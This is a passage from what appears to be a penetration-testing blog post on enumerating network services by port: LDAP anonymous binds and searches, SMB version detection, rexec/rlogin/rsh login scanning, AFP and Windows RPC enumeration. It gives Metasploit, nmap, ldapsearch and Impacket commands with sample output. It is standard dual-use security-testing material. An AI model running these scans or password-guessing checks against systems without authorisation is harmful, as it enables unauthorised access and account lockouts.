</span><span class='line'>|       supportedCapabilities: 1.2.xx.xx.1.4.800
</span><span class='line'>|       supportedCapabilities: 1.2.xx.xx.1.4.1670
</span><span class='line'>|       supportedCapabilities: 1.2.xx.xx.1.4.1791
</span><span class='line'>|       supportedCapabilities: 1.2.xx.xx.1.4.1935
</span><span class='line'>|       supportedCapabilities: 1.2.xx.xx.1.4.2080
</span><span class='line'>|       supportedCapabilities: 1.2.xx.xx.1.4.2237
</span><span class='line'>|       isSynchronized: TRUE
</span><span class='line'>|       isGlobalCatalogReady: TRUE
</span><span class='line'>|       domainFunctionality: 3
</span><span class='line'>|       forestFunctionality: 3
</span><span class='line'>|_      domainControllerFunctionality: 6
</span><span class='line'>
</span><span class='line'>Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
</span></code></pre></td></tr></table></div></figure></li>

<li><a href="https://nmap.org/nsedoc/scripts/ldap-search.html">ldap-search.nse</a>: Attempts to perform an LDAP search and returns all matches.

If no username and password is supplied to the script the Nmap registry is consulted. If the ldap-brute script has been selected and it found a valid account, this account will be used. If not anonymous bind will be used as a last attempt.

Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 389 --script ldap-search --script-args 'ldap.username="cn=ldaptest,cn=users,dc=cqure,dc=net",ldap.password=ldaptest,
</span><span class='line'>ldap.qfilter=users,ldap.attrib=sAMAccountName' &lt;host&gt;
</span><span class='line'>
</span><span class='line'>nmap -p 389 --script ldap-search --script-args 'ldap.username="cn=ldaptest,cn=users,dc=cqure,dc=net",ldap.password=ldaptest,
</span><span class='line'>ldap.qfilter=custom,ldap.searchattrib="operatingSystem",ldap.searchvalue="Windows *Server*",ldap.attrib={operatingSystem,whencreated,OperatingSystemServicePack}' &lt;host&gt;</span></code></pre></td></tr></table></div></figure></li>

<li><a href="https://nmap.org/nsedoc/scripts/ldap-brute.html">ldap-brute.nse</a>: Attempts to brute-force LDAP authentication. By default it uses the built-in username and password lists. In order to use your own lists use the userdb and passdb script arguments.

This script does not make any attempt to prevent account lockout! If the number of passwords in the dictionary exceed the amount of allowed tries, accounts will be locked out. This usually happens very quickly.</li>
</ol>


<p>Anonymous LDAP Binding allows a client to connect and search the directory ( bind and search) without logging in. You do not need to include binddn and bindpasswd.</p>

<p>If the port 389 supports Anonymous Bind, we may try searching for the base by using doing a ldap search query</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ldapsearch -h 10.10.xx.xx -p 389 -x -s base -b '' "(objectClass=*)" "*" +
</span><span class='line'>-h ldap server
</span><span class='line'>-p port of ldap
</span><span class='line'>-x simple authentication
</span><span class='line'>-b search base
</span><span class='line'>-s scope is defined as base</span></code></pre></td></tr></table></div></figure>


<p>Sample Output</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> ldapsearch -h 10.10.xx.xx -p 389 -x -s base -b '' "(objectClass=*)" "*" +
</span><span class='line'># extended LDIF
</span><span class='line'>#
</span><span class='line'># LDAPv3
</span><span class='line'># base &lt;&gt; with scope baseObject
</span><span class='line'># filter: (objectClass=*)
</span><span class='line'># requesting: * + 
</span><span class='line'>#
</span><span class='line'>
</span><span class='line'>#
</span><span class='line'>dn:
</span><span class='line'>objectClass: top
</span><span class='line'>objectClass: OpenLDAProotDSE
</span><span class='line'>structuralObjectClass: OpenLDAProotDSE
</span><span class='line'>configContext: cn=config
</span><span class='line'>namingContexts: dc=example,dc=com
</span><span class='line'>supportedControl: 1.3.xx.xx.4.1.4203.1.9.1.1
</span><span class='line'>supportedControl: 2.16.xx.xx.113730.3.4.18
</span><span class='line'>supportedControl: 2.16.xx.xx.113730.3.4.2
</span><span class='line'>supportedControl: 1.3.xx.xx.4.1.4203.1.10.1
</span><span class='line'>supportedControl: 1.2.xx.xx.1.4.319
</span><span class='line'>supportedControl: 1.2.xx.xx.1.334810.2.3
</span><span class='line'>supportedControl: 1.2.xx.xx.1.3344810.2.3
</span><span class='line'>supportedControl: 1.3.xx.xx.1.13.2
</span><span class='line'>supportedControl: 1.3.xx.xx.1.13.1
</span><span class='line'>supportedControl: 1.3.xx.xx.1.12
</span><span class='line'>supportedExtension: 1.3.xx.xx.4.1.4203.1.11.1
</span><span class='line'>supportedExtension: 1.3.xx.xx.4.1.4203.1.11.3
</span><span class='line'>supportedFeatures: 1.3.xx.xx.1.14
</span><span class='line'>supportedFeatures: 1.3.xx.xx.4.1.4203.1.5.1
</span><span class='line'>supportedFeatures: 1.3.xx.xx.4.1.4203.1.5.2
</span><span class='line'>supportedFeatures: 1.3.xx.xx.4.1.4203.1.5.3
</span><span class='line'>supportedFeatures: 1.3.xx.xx.4.1.4203.1.5.4
</span><span class='line'>supportedFeatures: 1.3.xx.xx.4.1.4203.1.5.5
</span><span class='line'>supportedLDAPVersion: 3
</span><span class='line'>entryDN:
</span><span class='line'>subschemaSubentry: cn=Subschema
</span><span class='line'>
</span><span class='line'># search result
</span><span class='line'>search: 2
</span><span class='line'>result: 0 Success
</span><span class='line'>
</span><span class='line'># numResponses: 2
</span><span class='line'># numEntries: 1</span></code></pre></td></tr></table></div></figure>


<p>Once you are aware of the base name in the above example &ldquo;example.com&rdquo; we can query for ldap users etc. by</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ldapsearch -h 10.10.xx.xx -p 389 -x -b "dc=example,dc=com"</span></code></pre></td></tr></table></div></figure>


<p>Sample Output</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># johnsmith, EXAUSERS, People, example.com
</span><span class='line'>dn: uid=johnsmith,ou=EXAUSERS,ou=People,dc=example,dc=com
</span><span class='line'>displayName: John Smith
</span><span class='line'>ntUserLastLogon: 130150432350834365
</span><span class='line'>givenName: John
</span><span class='line'>objectClass: top
</span><span class='line'>objectClass: person
</span><span class='line'>objectClass: organizationalperson
</span><span class='line'>objectClass: inetOrgPerson
</span><span class='line'>objectClass: ntUser
</span><span class='line'>objectClass: shadowAccount
</span><span class='line'>uid: johnsmith
</span><span class='line'>cn: John Smith
</span><span class='line'>ntUserCodePage: 0
</span><span class='line'>ntUserDomainId: johnsmith
</span><span class='line'>ntUserLastLogoff: 0
</span><span class='line'>ntUniqueId: 75ac21092c755e42b2129a224eb328dd
</span><span class='line'>ntUserDeleteAccount: true
</span><span class='line'>ntUserAcctExpires: 9223372036854775807
</span><span class='line'>sn: John</span></code></pre></td></tr></table></div></figure>


<p>Things to add in LDAP &ndash; User authentication and Jxplorer</p>

<h3>SMB | Port 445</h3>

<p><strong>Metasploit</strong> has</p>

<ol>
<li><strong>SMB Version Detection</strong> which provides the operating system version.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/smb/smb_version
</span><span class='line'>services -p 445 -R</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] 10.87.xx.xx:445 is running Windows 7 Professional SP1 (build:7601) (name:3BPC13B0843) (domain:XXX)
</span><span class='line'>[*] 10.87.xx.xx:445 is running Windows 7 Professional SP1 (build:7601) (name:3BWK14F0040) (domain:XXX)</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<h3>rexec | Port 512</h3>

<p><strong>Metasploit</strong> has</p>

<ol>
<li><strong>rexec Authentication Scanner</strong> to find if there is any open shell.

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>auxiliary/scanner/rservices/rexec_login
</span><span class='line'>services -p 512 -u -R</span></code></pre></td></tr></table></div></figure>
Sample output with the username root and empty password:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] 10.10.xx.xx:512 REXEC - [1/1] - Attempting rexec with username:password 'root':''
</span><span class='line'>[-] Result: Where are you?
</span><span class='line'>[*] 10.10.xx.xx:512 - Starting rexec sweep
</span><span class='line'>[*] 10.10.xx.xx:512 REXEC - [1/1] - Attempting rexec with username:password 'root':''
</span><span class='line'>[*] 10.10.xx.xx:512 - Starting rexec sweep
</span><span class='line'>[*] 10.10.xx.xx:512 REXEC - [1/1] - Attempting rexec with username:password 'root':''
</span><span class='line'>[+] 10.10.xx.xx:512, rexec 'root' : ''</span></code></pre></td></tr></table></div></figure>

The above can be accessed using
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>rlogin &lt;ipaddress&gt;</span></code></pre></td></tr></table></div></figure>
</li>

</ol>


<p><strong>Nmap</strong> has</p>

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/rexec-brute.html">rexec-brute.nse</a>: Performs brute force password auditing against the classic UNIX rexec (remote exec) service.

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>nmap -p 512 --script rexec-brute &lt;ip&gt;</span></code></pre></td></tr></table></div></figure></li>
</ol>


<h3>rlogin | Port 513</h3>

<p><strong>Metasploit</strong> has</p>

<ol>
<li><strong>rlogin Authentication Scanner</strong>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/rservices/rlogin_login
</span><span class='line'>services -p 513 -u -R</span></code></pre></td></tr></table></div></figure>
Sample Output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 10.10.xx.xx:513, rlogin 'root' from 'root' with no password.
</span><span class='line'>[+] 10.10.xx.xx:513, rlogin 'root' from 'root' with no password.</span></code></pre></td></tr></table></div></figure>
Note: In a recent engagement just doing the "rlogin IP" using the root shell provided me the root shell, where-as few IP address asked for password. Also, One IP for which rexec_login shows failed, was able to login using rlogin.

Maybe refer: Metasploitable 2 : DOC-1875 document.
</li>
</ol>


<h3>RSH | port 514</h3>

<p><strong>Metasploit</strong> has</p>

<ol>
<li><strong>rsh Authentication Scanner</strong>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/rservices/rsh_login
</span><span class='line'>services -p 514 -u -R</span></code></pre></td></tr></table></div></figure>
Sample Output
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[+] 10.10.xx.xx:514, rsh 'root' from 'root' with no password.
</span><span class='line'>[*] 10.11.xx.xx:514 RSH - Attempting rsh with username 'root' from 'root'
</span><span class='line'>[+] 10.11.xx.xx:514, rsh 'root' from 'root' with no password.</span></code></pre></td></tr></table></div></figure>

Sample Run:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> rsh 10.11.xx.xx whoami
</span><span class='line'>Integrated PrintNet Enterprise</span></code></pre></td></tr></table></div></figure></li>
</ol>


<h3>AFP | Apple Filing Protocol | Port 548</h3>

<p>AFP is a proprietary network protocol that offers file services for MAC OS X and original MAC OS.</p>

<p><strong>Metasploit</strong> has two auxiliary modules available.</p>

<ol>
<li><strong>Apple Filing Protocol Info Enumerator</strong>: 

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/afp/afp_server_info
</span><span class='line'>services -p 548 -u -S AFP -R</span></code></pre></td></tr></table></div></figure>
Sample output:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>[*] AFP 10.11.xx.xx Scanning...
</span><span class='line'>[*] AFP 10.11.xx.xx:548:548 AFP:
</span><span class='line'>[*] AFP 10.11.xx.xx:548 Server Name: example-airport-time-capsule 
</span><span class='line'>[*] AFP 10.11.xx.xx:548  Server Flags: 
</span><span class='line'>[*] AFP 10.11.xx.xx:548     *  Super Client: true 
</span><span class='line'>[*] AFP 10.11.xx.xx:548     *  UUIDs: true 
</span><span class='line'>[*] AFP 10.11.xx.xx:548     *  UTF8 Server Name: true 
</span><span class='line'>[*] AFP 10.11.xx.xx:548     *  Open Directory: true 
</span><span class='line'>[*] AFP 10.11.xx.xx:548     *  Reconnect: true 
</span><span class='line'>[*] AFP 10.11.xx.xx:548     *  Server Notifications: true 
</span><span class='line'>[*] AFP 10.11.xx.xx:548     *  TCP/IP: true 
</span><span class='line'>[*] AFP 10.11.xx.xx:548     *  Server Signature: true 
</span><span class='line'>[*] AFP 10.11.xx.xx:548     *  Server Messages: true 
</span><span class='line'>[*] AFP 10.11.xx.xx:548     *  Password Saving Prohibited: false 
</span><span class='line'>[*] AFP 10.11.xx.xx:548     *  Password Changing: true 
</span><span class='line'>[*] AFP 10.11.xx.xx:548     *  Copy File: true 
</span><span class='line'>[*] AFP 10.11.xx.xx:548  Machine Type: TimeCapsule8,119 
</span><span class='line'>[*] AFP 10.11.xx.xx:548  AFP Versions: AFP3.3, AFP3.2, AFP3.1 
</span><span class='line'>[*] AFP 10.11.xx.xx:548  UAMs: DHCAST128, DHX2, SRP, Recon1
</span><span class='line'>[*] AFP 10.11.xx.xx:548  Server Signature: 4338364c4e355635463948350069672d
</span><span class='line'>[*] AFP 10.11.xx.xx:548  Server Network Address: 
</span><span class='line'>[*] AFP 10.11.xx.xx:548     *  10.11.4.76:548 
</span><span class='line'>[*] AFP 10.11.xx.xx:548     *  [fe80:0009:0000:0000:9272:40ff:fe0b:99b7]:548 
</span><span class='line'>[*] AFP 10.11.xx.xx:548     *  10.11.4.76 
</span><span class='line'>[*] AFP 10.11.xx.xx:548   UTF8 Server Name: Example's AirPort Time Capsule
</span><span class='line'>[*] Scanned 1 of 1 hosts (100% complete)
</span><span class='line'>[*] Auxiliary module execution completed</span></code></pre></td></tr></table></div></figure>
</li>
<li><strong>Apple Filing Protocol Login Utility</strong> which attempts to bruteforce authentication credentials for AFP.
</li>
</ol>


<p>In <strong>Nmap</strong>, we have</p>

<ol>
<li><a href="https://nmap.org/nsedoc/scripts/afp-serverinfo.html">afp-serverinfo.nse</a>: Shows AFP server information.</li>
<li><a href="https://nmap.org/nsedoc/scripts/afp-brute.html">afp-brute.nse</a>: Performs password guessing against Apple Filing Protocol (AFP).</li>
<li><a href="https://nmap.org/nsedoc/scripts/afp-ls.html">afp-ls.nse</a>: Attempts to get useful information about files from AFP volumes. The output is intended to resemble the output of ls.</li>
<li><a href="https://nmap.org/nsedoc/scripts/afp-showmount.html">afp-showmount.nse</a>: Shows AFP shares and ACLs.</li>
<li><a href="https://nmap.org/nsedoc/scripts/afp-path-vuln.html">afp-path-vuln.nse</a>: Detects the Mac OS X AFP directory traversal vulnerability, CVE-2010-0533.</li>
</ol>


<h3>Microsoft Windows RPC Services | Port 135 and Microsoft RPC Services over HTTP | Port 593</h3>

<p>Depending on the host configuration, the RPC endpoint mapper can be accessed through TCP and UDP port 135, via SMB with a null or authenticated session (TCP 139 and 445), and as a web service listening on TCP port 593.</p>

<p><strong>Metasploit</strong> has</p>

<ol>
<li><strong>Endpoint Mapper Service Discovery</strong>: This module can be used to obtain information from the Endpoint Mapper service
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/dcerpc/endpoint_mapper</span></code></pre></td></tr></table></div></figure></li>
<li><strong>Hidden DCERPC Service Discovery</strong>:   This module will query the endpoint mapper and make a list of all ncacn_tcp RPC services. It will then connect to each of these services and use the management API to list all other RPC services accessible on this port. Any RPC service found attached to a TCP port, but not listed in the endpoint mapper, will be displayed and analyzed to see whether anonymous access is permitted.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/dcerpc/hidden</span></code></pre></td></tr></table></div></figure>
</li>
<li><strong>Remote Management Interface Discovery</strong>:   This module can be used to obtain information from the Remote Management Interface DCERPC service.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/dcerpc/management</span></code></pre></td></tr></table></div></figure>
</li>
<li><strong>DCERPC TCP Service Auditor</strong>: Determine what DCERPC services are accessible over a TCP port.

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor</span></code></pre></td></tr></table></div></figure>
</li>
</ol>


<p>We can use <strong>rpcdump</strong> from <strong>Impacket</strong> to dump the RPC information. This tool can communicate over Port 135,139 and 445. The rpcdump tool from rpctools can also extract information from Port 593.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Impacket v0.9.14-dev - Copyright 2002-2015 Core Security Technologies
</span><span class='line'>
</span><span class='line'>usage: rpcdump.py [-h] [-debug] [-hashes LMHASH:NTHASH]
</span><span class='line'>                  target [{445/SMB,135/TCP,139/SMB}]
</span><span class='line'>
</span><span class='line'>Dumps the remote RPC endpoints information</span></code></pre></td></tr></table></div></figure>


<p>Sample Output:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
<span class='line-number'>150</span>
<span class='line-number'>151</span>
<span class='line-number'>152</span>
<span class='line-number'>153</span>
<span class='line-number'>154</span>
<span class='line-number'>155</span>
<span class='line-number'>156</span>
<span class='line-number'>157</span>
<span class='line-number'>158</span>
<span class='line-number'>159</span>
<span class='line-number'>160</span>
<span class='line-number'>161</span>
<span class='line-number'>162</span>
<span class='line-number'>163</span>
<span class='line-number'>164</span>
<span class='line-number'>165</span>
<span class='line-number'>166</span>
<span class='line-number'>167</span>
<span class='line-number'>168</span>
<span class='line-number'>169</span>
<span class='line-number'>170</span>
<span class='line-number'>171</span>
<span class='line-number'>172</span>
<span class='line-number'>173</span>
<span class='line-number'>174</span>
<span class='line-number'>175</span>
<span class='line-number'>176</span>
<span class='line-number'>177</span>
<span class='line-number'>178</span>
<span class='line-number'>179</span>
<span class='line-number'>180</span>
<span class='line-number'>181</span>
<span class='line-number'>182</span>
<span class='line-number'>183</span>
<span class='line-number'>184</span>
<span class='line-number'>185</span>
<span class='line-number'>186</span>
<span class='line-number'>187</span>
<span class='line-number'>188</span>
<span class='line-number'>189</span>
<span class='line-number'>190</span>
<span class='line-number'>191</span>
<span class='line-number'>192</span>
<span class='line-number'>193</span>
<span class='line-number'>194</span>
<span class='line-number'>195</span>
<span class='line-number'>196</span>
<span class='line-number'>197</span>
<span class='line-number'>198</span>
<span class='line-number'>199</span>
<span class='line-number'>200</span>
<span class='line-number'>201</span>
<span class='line-number'>202</span>
<span class='line-number'>203</span>
<span class='line-number'>204</span>
<span class='line-number'>205</span>
<span class='line-number'>206</span>
<span class='line-number'>207</span>
<span class='line-number'>208</span>
<span class='line-number'>209</span>
<span class='line-number'>210</span>
<span class='line-number'>211</span>
<span class='line-number'>212</span>
<span class='line-number'>213</span>
<span class='line-number'>214</span>
<span class='line-number'>215</span>
<span class='line-number'>216</span>
<span class='line-number'>217</span>
<span class='line-number'>218</span>
<span class='line-number'>219</span>
<span class='line-number'>220</span>
<span class='line-number'>221</span>
<span class='line-number'>222</span>
<span class='line-number'>223</span>
<span class='line-number'>224</span>
<span class='line-number'>225</span>
<span class='line-number'>226</span>
<span class='line-number'>227</span>
<span class='line-number'>228</span>
<span class='line-number'>229</span>
<span class='line-number'>230</span>
<span class='line-number'>231</span>
<span class='line-number'>232</span>
<span class='line-number'>233</span>
<span class='line-number'>234</span>
<span class='line-number'>235</span>
<span class='line-number'>236</span>
<span class='line-number'>237</span>
<span class='line-number'>238</span>
<span class='line-number'>239</span>
<span class='line-number'>240</span>
<span class='line-number'>241</span>
<span class='line-number'>242</span>
<span class='line-number'>243</span>
<span class='line-number'>244</span>
<span class='line-number'>245</span>
<span class='line-number'>246</span>
<span class='line-number'>247</span>
<span class='line-number'>248</span>
<span class='line-number'>249</span>
<span class='line-number'>250</span>
<span class='line-number'>251</span>
<span class='line-number'>252</span>
<span class='line-number'>253</span>
<span class='line-number'>254</span>
<span class='line-number'>255</span>
<span class='line-number'>256</span>
<span class='line-number'>257</span>
<span class='line-number'>258</span>
<span class='line-number'>259</span>
<span class='line-number'>260</span>
<span class='line-number'>261</span>
<span class='line-number'>262</span>
<span class='line-number'>263</span>
<span class='line-number'>264</span>
<span class='line-number'>265</span>
<span class='line-number'>266</span>
<span class='line-number'>267</span>
<span class='line-number'>268</span>
<span class='line-number'>269</span>
<span class='line-number'>270</span>
<span class='line-number'>271</span>
<span class='line-number'>272</span>
<span class='line-number'>273</span>
<span class='line-number'>274</span>
<span class='line-number'>275</span>
<span class='line-number'>276</span>
<span class='line-number'>277</span>
<span class='line-number'>278</span>
<span class='line-number'>279</span>
<span class='line-number'>280</span>
<span class='line-number'>281</span>
<span class='line-number'>282</span>
<span class='line-number'>283</span>
<span class='line-number'>284</span>
<span class='line-number'>285</span>
<span class='line-number'>286</span>
<span class='line-number'>287</span>
<span class='line-number'>288</span>
